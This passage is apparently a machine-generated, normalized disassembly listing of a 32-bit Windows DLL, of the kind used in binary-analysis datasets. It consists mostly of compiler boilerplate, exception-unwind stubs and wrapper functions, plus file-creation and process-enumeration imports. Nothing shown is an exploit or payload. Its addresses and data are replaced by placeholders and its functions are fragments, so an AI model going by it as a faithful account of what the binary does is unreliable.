push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_1003b1e3
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003b0f5
add esp 0x10
pop ebp
retn
sub_1003b2c1
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_1003bbd8
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003bb1c
add esp 0xc
pop ebp
retn
sub_1003bcbe
push esi
mov esi ecx
call sub_1003d0e1
push [ esp + 0x8 ]
mov ecx esi
call sub_1003d49a
mov eax [ esp + 0xc ]
mov [ esi + 0x1c ] eax
mov eax [ esp + 0x10 ]
mov [ esi + 0x20 ] eax
pop esi
retn 0xc
sub_1003bd0f
mov eax [ esp + 0x4 ]
mov ecx [ esp + 0x8 ]
cmp eax ecx
je r-xdata
retn
mov edx [ eax ]
push esi
mov esi [ ecx ]
mov [ eax ] esi
mov [ ecx ] edx
pop esi
sub_1003bd26
mov ecx [ ecx + 0x4 ]
test ecx ecx
je r-xdata
retn
jmp sub_10003d5c
sub_1003bd33
push [ ecx ]
call sub_10024d36
pop ecx
retn
sub_1003bd82
push esi
mov esi ecx
push 0x0
push 0x1
lea ecx [ esi + 0x30 ]
mov [ esi ] r--data
call sub_10002020
mov ecx esi
pop esi
jmp sub_10001b5e
sub_1003bdbd
push esi
mov esi ecx
call sub_1003bd82
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1003bee5
push esi
mov esi [ esp + 0x8 ]
test esi esi
je r-xdata
pop esi
retn
mov ecx esi
call sub_1003be0f
push esi
call sub_100242e6
pop ecx
sub_1003bf77
mov eax [ ebp - 0x14 ]
cmp [ eax + 0x24 ] 0x10
jb r-xdata
add eax 0x10
mov eax [ eax + 0x10 ]
jmp r-xdata
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
sub_1003bf9f
push esi
push 0xffffffff
push 0x0
push [ esp + 0x10 ]
mov esi ecx
call sub_10001450
mov eax esi
pop esi
retn 0x4
sub_1003bfb5
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_1003bf9f
mov eax [ esp + 0xc ]
mov [ esi + 0x1c ] eax
mov eax [ esp + 0x10 ]
mov [ esi + 0x20 ] eax
pop esi
retn 0xc
sub_1003bfd3
mov ecx [ esp + 0x8 ]
push 0xffffffff
push 0x0
push [ esp + 0xc ]
call sub_10001450
retn
sub_1003c232
push [ ebp + 0x8 ]
call sub_1003bee5
pop ecx
push 0x0
push 0x0
call sub_10027dd1
int3
sub_1003c245
push [ ecx + 0xc ]
call sub_1003bee5
pop ecx
retn
sub_1003c2d5
push esi
mov esi ecx
mov [ esi ] r--data
mov ecx [ esi + 0x50 ]
test ecx ecx
je r-xdata
mov ecx esi
pop esi
jmp sub_1003bd82
call sub_10003d5c
sub_1003c2f2
push esi
mov esi ecx
call sub_1003c2d5
test [ esp + 0x8 ] 0x1
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
sub_1003c4a3
mov ecx [ ebp - 0x14 ]
call sub_1003befe
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
sub_1003c52e
mov ecx [ ebp - 0x14 ]
add ecx 0x4c
call sub_1003bd5e
mov eax r-xdata
retn
sub_1003c542
mov eax edi
call sub_100282db
retn 0x10
sub_1003c54c
mov eax [ esp + 0x4 ]
push esi
mov esi ecx
mov ecx [ eax ]
add eax 0x4
mov [ esi ] ecx
push eax
lea ecx [ esi + 0x4 ]
call sub_10003d36
mov eax esi
pop esi
retn 0x4
sub_1003cc8b
xor al al
retn
sub_1003ce07
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_100246bb
pop ecx
push eax
push [ esp + 0x10 ]
mov ecx esi
push [ esp + 0x10 ]
call sub_1003cd1f
pop esi
retn 0x8
sub_1003ce28
push esi
push [ esp + 0x8 ]
mov esi ecx
call sub_100246bb
pop ecx
push eax
push [ esp + 0x10 ]
mov ecx esi
push [ esp + 0x10 ]
call sub_1003cd94
pop esi
retn 0x8
sub_1003d0e1
push esi
push 0xffffffff
mov esi ecx
call sub_1003d026
push eax
mov ecx esi
call sub_10001629
mov eax esi
pop esi
retn
sub_1003d481
push esi
push 0x0
mov esi ecx
call sub_1003d425
mov [ esi ] r--data
mov eax esi
pop esi
retn
sub_1003d495
xor eax eax
retn 0x10
sub_1003d9e4
mov eax [ esp + 0x4 ]
mov edx [ esp + 0x8 ]
mov [ eax ] edx
mov [ eax + 0x4 ] ecx
retn 0x8
sub_1003da14
mov eax [ esp + 0x4 ]
cmp ecx [ eax + 0x4 ]
jne r-xdata
xor eax eax
mov eax [ eax ]
cmp eax [ esp + 0x8 ]
jne r-xdata
xor eax eax
inc eax
jmp r-xdata
retn 0x8
sub_1003da2f
mov eax r--data
retn
sub_1003dae7
push [ ecx ]
call [ LocalFree@IAT ]
retn
sub_1003daf0
mov eax r--data
retn
sub_1003daf6
mov eax r--data
retn
sub_1003dafc
test [ esp + 0x4 ] 0x1
push esi
mov esi ecx
mov [ esi ] r--data
je r-xdata
mov eax esi
pop esi
retn 0x4
push esi
call sub_100242e6
pop ecx
CreateToolhelp32Snapshot
jmp [ CreateToolhelp32Snapshot@IAT ]
Process32FirstW
jmp [ Process32FirstW@IAT ]
Process32NextW
jmp [ Process32NextW@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_1003e422
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
add ecx 0x58
push ecx
mov ecx [ ebp + 0x8 ]
call sub_10001fc2
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1003e761
mov edi edi
push ebp
mov ebp esp
call sub_1004b186
mov ecx eax
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
mov [ eax + 0x4 ] edx
pop ebp
retn 0x4
sub_1003e779
mov edi edi
push ebp
mov ebp esp
push ecx
and [ ebp - 0x4 ] 0x0
call sub_10032be4
mov ecx [ ebp + 0x8 ]
mov [ ecx ] eax
mov eax ecx
leave
retn 0x4
sub_1003e89e
mov [ ecx ] r--data
retn
sub_1003e8a5
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_10024d36
push [ esi + 0x10 ]
call sub_10024d36
push [ esi + 0x14 ]
call sub_10024d36
add esp 0xc
pop esi
retn
sub_1003e917
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
call sub_10024d36
push [ esi + 0xc ]
call sub_10024d36
pop ecx
pop ecx
pop esi
retn
sub_1003ec27
push 0x5
pop eax
retn
sub_1003ec4e
mov edi edi
push esi
mov esi ecx
cmp [ esi + 0x14 ] 0x0
mov [ esi ] r--data
je r-xdata
mov [ esi ] r--data
pop esi
retn
push [ esi + 0x10 ]
call sub_10024aba
pop ecx
sub_1003ec91
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10023aa7
add esp 0x10
pop ebp
retn 0xc
sub_1003ed0d
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x8 ]
call sub_10023a0b
pop ecx
pop ecx
pop ebp
retn 0x4
sub_1003ed54
mov edi edi
push ebp
mov ebp esp
add ecx 0x8
push ecx
push [ ebp + 0x8 ]
call sub_1002399e
pop ecx
pop ecx
pop ebp
retn 0x4
sub_1003edd1
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1003ed9b
sub_1003ee85
mov edi edi
push ebp
mov ebp esp
pop ebp
jmp sub_1003ee3d
sub_1003ef42
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10024aba
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_1003f009
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003e8ed
mov [ esi ] r--data
pop esi
retn
sub_1003f021
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x20 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_1003f032
mov edi edi
push ebp
mov ebp esp
mov ecx [ ecx + 0x24 ]
mov eax [ ebp + 0x8 ]
mov [ eax ] ecx
pop ebp
retn 0x4
sub_1003f066
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10001b23
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_1003f084
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_100052ac
add esp 0xc
pop ebp
retn
sub_1003f108
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003f066
add esp 0x10
pop ebp
retn
sub_1003f16a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100019ec
mov eax [ ebp + 0x8 ]
add esp 0x10
pop ebp
retn
sub_1003f266
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1003f16a
add esp 0x10
pop ebp
retn
sub_1003f53f
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003e8ed
mov [ esi ] r--data
pop esi
retn
sub_1003f557
mov ax [ ecx + 0xc ]
retn
sub_1003f55c
mov eax [ ecx + 0x1c ]
retn
sub_1003f587
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10024aba
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_1003f82a
mov ecx [ ebp - 0x14 ]
call sub_1003e8a5
xor ebx ebx
push ebx
push ebx
call sub_10027dd1
int3
sub_1003fa82
mov ecx [ ebp - 0x14 ]
call sub_1003e8ed
push 0x0
push 0x0
call sub_10027dd1
int3
sub_1003fda0
mov ecx [ ebp - 0x14 ]
call sub_1003e8ed
push 0x0
push 0x0
call sub_10027dd1
int3
sub_1003fe25
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0xc ]
mov esi ecx
push [ ebp + 0x8 ]
call sub_1003f2fd
mov eax esi
pop esi
pop ebp
retn 0x8
sub_1003fe3f
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_1003f0c6
pop ecx
pop ecx
pop ebp
retn 0x4
sub_1003ff07
mov ax [ ecx + 0xe ]
retn
sub_1003ff0c
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003e8a5
mov [ esi ] r--data
pop esi
retn
sub_100401de
mov eax [ ebp + 0x8 ]
mov ecx [ ebp - 0x18 ]
mov [ ebp + 0x8 ] eax
inc eax
mov [ ebp - 0x10 ] esp
push eax
mov [ ebp - 0x4 ] 0x2
call sub_1003fe3f
mov [ ebp - 0x14 ] eax
mov eax r-xdata
retn
sub_1004024f
mov ecx [ ebp - 0x18 ]
xor esi esi
push esi
push 0x1
call sub_100400d2
push esi
push esi
call sub_10027dd1
int3
sub_100403c6
push 0x0
push 0x1
call sub_100400d2
retn
sub_100403d0
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10040467
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x8 ]
mov eax [ ecx ]
and [ ebp - 0x4 ] 0x0
call [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100410b9
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1000136c
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_100412b2
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x8 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001c7f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100412ce
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1000134a
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100412ea
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1000134a
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10041306
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_1000134a
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100415a2
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10040c78
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100415be
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10040c78
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100417be
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10040cc9
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_100419b7
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10040c78
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_100436bc
mov ecx [ ebp - 0x14 ]
call sub_1003e917
xor ebx ebx
push ebx
push ebx
call sub_10027dd1
int3
sub_100453e3
mov ecx [ ebp - 0x14 ]
call sub_1003e917
xor ebx ebx
push ebx
push ebx
call sub_10027dd1
int3
sub_10045841
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003e917
mov [ esi ] r--data
pop esi
retn
sub_10047245
mov eax [ ecx + 0x10 ]
retn
sub_10047249
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003e917
mov [ esi ] r--data
pop esi
retn
sub_100485f7
or eax 0xffffffff
retn 0x8
sub_100485fd
retn 0x4
sub_10048646
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003e8ed
mov [ esi ] r--data
pop esi
retn
sub_10048685
mov edi edi
push esi
mov esi ecx
push [ esi + 0x8 ]
mov [ esi ] r--data
call sub_10024aba
pop ecx
mov [ esi ] r--data
pop esi
retn
sub_10048885
mov ecx [ ebp - 0x14 ]
call sub_1003e8ed
push 0x0
push 0x0
call sub_10027dd1
int3
sub_1004899d
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001fc2
mov eax [ ebp + 0x8 ]
leave
retn 0x14
sub_10048e65
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x10 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001c7f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10048e81
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x14 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001c7f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_10048e9d
mov edi edi
push ebp
mov ebp esp
push ecx
push [ ecx + 0x18 ]
mov ecx [ ebp + 0x8 ]
and [ ebp - 0x4 ] 0x0
call sub_10001c7f
mov eax [ ebp + 0x8 ]
leave
retn 0x4
sub_1004a1ea
mov ecx [ ebp - 0x14 ]
call sub_1003e917
xor ebx ebx
push ebx
push ebx
call sub_10027dd1
int3
sub_1004a573
mov edi edi
push esi
mov esi ecx
mov [ esi ] r--data
call sub_1003e917
mov [ esi ] r--data
pop esi
retn
sub_1004b186
mov edi edi
push esi
call sub_10029ba7
mov esi [ eax + 0x4 ]
call sub_10029b81
mov edx eax
mov eax esi
pop esi
retn
sub_1004b54a
mov eax rw-data
retn
sub_1004b550
mov eax rw-data
retn
sub_1004b5e0
cmp [ rw-data ] 0x0
je sub_1004b616
push ebp
mov ebp esp
sub esp 0x8
and esp 0xfffffff8
fstp [ esp ]
cvttsd2si eax [ esp ]
leave
retn
sub_1004b742
lea ecx [ ebp - 0x10 ]
jmp sub_100230e4
sub_1004b74a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004b765
mov ecx [ ebp - 0x10 ]
jmp sub_1003e89e
sub_1004b76d
mov ecx [ ebp - 0x10 ]
add ecx 0x18
jmp sub_1000206b
sub_1004b778
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004b793
lea ecx [ ebp - 0x10 ]
jmp sub_100230e4
sub_1004b79b
push [ ebp - 0x14 ]
call sub_100242e6
pop ecx
retn
sub_1004b7a5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004b7c0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004b7db
mov ecx [ ebp - 0x10 ]
jmp sub_10012639
sub_1004b7e3
mov ecx [ ebp - 0x10 ]
add ecx 0x1c
jmp sub_10012639
sub_1004b7ee
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004b809
mov ecx [ ebp - 0x10 ]
jmp sub_10001b5e
sub_1004b811
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004b82c
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004b834
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp + 0x8 ]
jmp sub_10012639
sub_1004b84d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004b868
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004b870
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004b88b
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004b893
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x288 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004b8bb
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004b8d6
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x1c ]
jmp sub_1000206b
sub_1004b8ef
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x28 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004b90a
lea ecx [ ebp - 0x30 ]
jmp sub_1000206b
sub_1004b912
lea ecx [ ebp - 0x4c ]
jmp sub_1000206b
sub_1004b91a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x50 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004b935
mov ecx [ ebp - 0x14 ]
jmp sub_1003bd82
sub_1004b93d
mov ecx [ ebp - 0x14 ]
add ecx 0x4c
jmp sub_1003bd26
sub_1004b948
push [ ebp + 0x8 ]
call sub_100242e6
pop ecx
retn
sub_1004b952
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004b96d
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004b975
lea ecx [ ebp - 0x60 ]
jmp sub_1000206b
sub_1004b97d
lea ecx [ ebp - 0x7c ]
jmp sub_10012639
sub_1004b985
lea ecx [ ebp - 0x60 ]
jmp sub_10012639
sub_1004b98d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0xd4 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004b9b5
lea ecx [ ebp - 0x60 ]
jmp sub_1000206b
sub_1004b9bd
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004b9c5
lea ecx [ ebp - 0x60 ]
jmp sub_10012639
sub_1004b9cd
lea ecx [ ebp - 0x60 ]
jmp sub_1000206b
sub_1004b9d5
lea ecx [ ebp - 0x7c ]
jmp sub_10012639
sub_1004b9dd
lea ecx [ ebp - 0x98 ]
jmp sub_10012639
sub_1004b9e8
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x9c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ba10
push [ ebp - 0x10 ]
call sub_100242e6
pop ecx
retn
sub_1004ba1a
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ba35
mov ecx [ ebp - 0x10 ]
jmp sub_100230e4
sub_1004ba3d
mov ecx [ ebp - 0x10 ]
add ecx 0x4
jmp sub_1000206b
sub_1004ba48
mov ecx [ ebp - 0x10 ]
add ecx 0x20
jmp sub_1000206b
sub_1004ba53
mov ecx [ ebp - 0x10 ]
add ecx 0x3c
jmp sub_1000206b
sub_1004ba5e
mov ecx [ ebp - 0x10 ]
add ecx 0x58
jmp sub_1000206b
sub_1004ba69
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004ba71
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004ba8c
mov ecx [ ebp - 0x88 ]
jmp sub_1003e89e
sub_1004ba97
lea ecx [ ebp - 0x84 ]
jmp sub_1000384f
sub_1004baa2
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x8c ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004baca
lea ecx [ ebp - 0x10 ]
jmp sub_10003c49
sub_1004bad2
push [ ebp - 0x14 ]
call sub_100242e6
pop ecx
retn
sub_1004badc
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004baf7
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004bb05
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bb20
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004bb2e
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bb49
mov ecx [ ebp - 0x10 ]
jmp sub_10012639
sub_1004bb51
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004bb59
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bb74
mov ecx [ ebp - 0x30 ]
jmp sub_10012639
sub_1004bb7c
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004bb84
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x34 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bba9
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_10012639
sub_1004bbc2
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
lea ecx [ ebp - 0x48 ]
jmp sub_10012639
sub_1004bbdb
mov eax [ ebp - 0x10 ]
and eax 0x4
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffb
mov ecx [ ebp + 0x8 ]
jmp sub_10012639
sub_1004bbf4
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x4c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bc0f
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004bc17
mov ecx [ ebp - 0x10 ]
jmp sub_10001b5e
sub_1004bc1f
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bc3a
lea ecx [ ebp - 0x1c ]
jmp sub_1003bd33
sub_1004bc42
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x20 ]
xor ecx eax
call sub_100242d7
mov ecx [ edx + 0x10c ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bc6a
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004bc78
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bc93
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
mov ecx [ ebp - 0x14 ]
jmp sub_1000206b
sub_1004bcac
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bcc7
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004bcd5
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bcf0
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004bcfe
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bd19
mov eax [ rw-data ]
and eax 0xfffffffe
mov [ rw-data ] eax
retn
sub_1004bd27
mov eax [ ebp - 0x10 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffe
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004bd40
mov eax [ ebp - 0x10 ]
and eax 0x2
je r-xdata
retn
and [ ebp - 0x10 ] 0xfffffffd
mov ecx [ ebp + 0x8 ]
jmp sub_1000206b
sub_1004bd59
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_100242d7
mov eax r--data
jmp sub_10027eaa
sub_1004bd74
lea ecx [ ebp - 0x30 ]
jmp sub_1003dae7
sub_1004bd7c
mov eax [ ebp - 0x34 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x34 ] 0xfffffffe
mov ecx [ ebp - 0x3c ]
jmp sub_1000206b
sub_1004bd95
lea ecx [ ebp - 0x2c ]
jmp sub_1000206b
sub_1004bd9d
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x40 ]
xor ecx eax
